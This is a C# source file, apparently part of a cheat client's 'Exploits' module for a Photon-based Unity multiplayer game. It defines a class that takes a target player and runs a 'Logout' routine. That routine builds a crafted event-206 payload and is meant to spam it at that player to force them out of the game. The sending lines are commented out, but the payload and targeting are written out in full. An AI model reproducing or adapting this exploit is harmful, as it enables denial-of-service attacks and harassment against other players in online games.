using System.Collections;
using System.Linq;
using UnityEngine;
#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#endif
using ExitGames.Client.Photon;

namespace NekoClient.Exploits
{
    public class Gen7_2
    {
        private class Gen7 : UnityEngine.MonoBehaviour
        {
            public Gen7()
            {
                DontDestroyOnLoad(this);
            }

            private IEnumerator Logout()
            {
                while (Targets != null)
                {
                    /*
#if STEAM
                    NPMLJGKDHLE eventTargets = new NPMLJGKDHLE()
                    {
                        GNKINNFFHNP = new int[] { Targets.ID() }
                    };
#elif OCULUS
                    OMHAGENIEHH eventTargets = new OMHAGENIEHH
                    {
                        CCBMOMDDJCE = new int[] { Targets.ID() }
                    };
#endif

                    ExitGames.Client.Photon.Hashtable hashExploit = new ExitGames.Client.Photon.Hashtable();

                    hashExploit[1] = 0;
                    hashExploit[10] = new object[]
                    {
                        new Vector3(0f, 0f, 0f),
                        new Quaternion(0f, 0f, 0f, 1f),
                        new Vector3(0f, 0f, 0f),
                        new byte[] { 121 }
                    };

                    for (int i = 0; i < 50; i++)
                    {
#if STEAM
                        hashExploit[0] = FDIANNCBNCM.EGHMLPONANN;

                        FDIANNCBNCM.IFACNHCIGCL.NOOLCKHLDMD(206, hashExploit, true, eventTargets);
#elif OCULUS
                        hashExploit[0] = KHEMPEFHPHC.KPDLOFPGIBJ;

                        KHEMPEFHPHC.NFGNJMCBHCK.NGNFKDIHHPH(206, hashExploit, true, eventTargets);
#endif
                    }*/

                    yield return new WaitForSeconds(0.5f);

                    /*eventTargets = null;
                    hashExploit = null;*/
                }
                
                yield return new WaitForEndOfFrame();
            }

            private static object BFLFBFPAIGI(byte[] CEMGDNIJMBG)
            {
                int num = 0;
                float x;
                Protocol.Deserialize(out x, CEMGDNIJMBG, ref num);
                float y;
                Protocol.Deserialize(out y, CEMGDNIJMBG, ref num);
                float z;
                Protocol.Deserialize(out z, CEMGDNIJMBG, ref num);
                float w;
                Protocol.Deserialize(out w, CEMGDNIJMBG, ref num);
                return new Vector4(x, y, z, w);
            }

            private static byte[] HCPNCJPJGKN(object NLOMAFMJOLO)
            {
                byte[] array = new byte[16];
                int num = 0;
                Protocol.Serialize(((Vector4)NLOMAFMJOLO).x, array, ref num);
                Protocol.Serialize(((Vector4)NLOMAFMJOLO).y, array, ref num);
                Protocol.Serialize(((Vector4)NLOMAFMJOLO).z, array, ref num);
                Protocol.Serialize(((Vector4)NLOMAFMJOLO).w, array, ref num);
                return array;
            }
            public void Trigger()
            {
                StartCoroutine(Logout());
            }

            private PhotonPlayer Targets;

            public void SetTarget(PhotonPlayer targets)
            {
                Targets = targets;
            }
        }

        private Gen7 gen7;

        private void InitializeObject()
        {
            GameObject targetObject = new GameObject();
            gen7 = targetObject.AddComponent<Gen7>();
            UnityEngine.Object.DontDestroyOnLoad(targetObject);
        }

        public Gen7_2(PhotonPlayer target)
        {
            InitializeObject();

            gen7.SetTarget(target);
        }

        public void Trigger()
        {
            gen7.Trigger();
        }
    }
}